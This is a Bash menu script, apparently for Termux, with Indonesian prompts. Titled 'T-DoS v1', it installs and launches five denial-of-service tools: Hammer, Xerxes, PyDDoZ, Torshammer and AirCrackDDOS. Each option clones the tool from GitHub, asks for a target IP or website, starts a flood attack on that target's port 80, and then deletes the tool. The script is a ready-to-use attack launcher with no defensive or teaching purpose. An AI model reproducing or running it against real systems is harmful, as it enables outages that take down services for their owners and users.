biru='\033[34;1m' #biru
green='\e[0;32m' #hijau muda
daun='\033[32;1m' #ijo
purple='\033[35;1m' #purple
cyyan='\033[36;1m' #cyan
merah='\033[31;1m' #merah
putih='\033[37;1m' #pur
tai='\033[33;1m' #kuning

garis() {
echo $merah "<<["$cyyan"=============================="$merah"]>>"
}

pil() {
echo $daun
read -p "[Masukan Pilihan Anda]>> " pilih
}

###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
echo $merah "\nKesalahan"
menu
pil
}

menu() {
clear
echo $tai '  ______ '$putih'  ____       _____'
echo $tai ' /_  __/' $putih' / __ \____ / ___/'
echo $tai '  / /  '$putih'  / / / / __ \\__ \'
echo $tai ' / /   '$putih' / /_/ / /_/ /__/ /'
echo $tai '/_/   '$putih' /_____/\____/____/ v1'
echo $purple '          Code by BL4CK DR460N'
echo """

"""
garis
echo $tai "     ["$purple"1"$tai"]"$biru" Hammer"
garis
echo $tai "     ["$purple"2"$tai"]"$biru" Xerxes"
garis
echo $tai "     ["$purple"3"$tai"]"$biru" PyDDoZ"
garis
echo $tai "     ["$purple"4"$tai"]"$biru" Torshammer"
garis
echo $tai "     ["$purple"5"$tai"]"$biru" AirCrackDDOS"
echo
garis
echo $tai "     ["$purple"E"$tai"]"$biru" Exit"
garis
pil
}

menu

if [ $pilih = "1" ] || [ $pilih = "01" ]
then
echo $daun "Installing Hammer"
sleep 2
pkg install python -y
pkg install curl wget -y
git clone https://github.com/cyweb/hammer
cd hammer
echo $merah
read -p "[Masukan Ip Target]>> " server
python3 hammer.py -s $server 80 135
sleep 3
rm -rf hammer
exit
fi

if [ $pilih = "2" ] || [ $pilih = "02" ]
then
echo $daun "Installing Xerxes"
sleep 2
pkg install clang git python -y
git clone https://github.com/zanyarjamal/xerxes
cd xerxes
chmod +x *
clang xerxes.c -o xerxes
chmod +x *
echo $merah
read -p "[Masukan Website Tanpa httpa/http]>> " web
./xerxes $web 80
rm -rf xerxes
exit
fi

if [ $pilih = "3" ] || [ $pilih = "03" ]
then
echo $daun "Installing PyDDoZ"
sleep 2
pkg install python curl python2 wget clang git ruby -y
gir clone https://github.com/0x01h/pyddoz
cd pyddoz
echo $merah
read -p "[Masukan Url Target]>> " url
read -p "[Masukan Port Target]>> " prt
read -p "[Masukan Treand Number ( 1/30 )]>> " tn
read -p "[Masukan TimeOut]>> " tm
read -p "[Mau Pake Proxy (y/n)]>> " pr
python3 pyddoz.py -u $url -th $tn -t $tm -p
rm -rf pyddoz
exit
fi

if [ $pilih = "4" ] || [ $pilih = "04" ]
then
echo $daun "Installing Torshammer"
sleep 2
pkg install python2 curl wget -y
git clone https://github.com/dotfighter/torshammer
cd torshammer
echo $daun
read -p "[Masukan Website Target Tanpa https/http]>> " web
python2 torshammer.py -t $web -p 80
rm -rf torshammer
exit
fi

if [ $pilih = "5" ] || [ $pilih = "05" ]
then
echo $daun "Installing AirCrackDDOS"
sleep 2
git clone https://github.com/R00TD4nZ/AirCrackDdos
cd AirCrackDdos
echo $daun
read -p "[Masukan Website Target Tanpa https/http]>> " web
python2 AirCrackDdos.py https://$web
rm -rf AirCrackDdos
exit
fi
